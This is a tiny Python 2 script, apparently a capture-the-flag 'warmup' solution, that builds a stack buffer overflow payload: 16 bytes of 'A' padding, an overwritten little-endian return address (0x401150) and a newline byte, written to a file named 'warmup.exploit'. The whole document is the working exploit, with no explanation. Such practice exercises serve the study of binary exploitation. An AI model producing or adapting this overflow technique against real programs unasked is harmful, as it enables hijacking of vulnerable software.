#!/bin/python2
from struct import pack

b = 'A'*16 
b += pack('<Q', 0x401150)
b += pack('<Q', 0x0A)

with open('warmup.exploit', 'wb') as f:
    f.write(b)
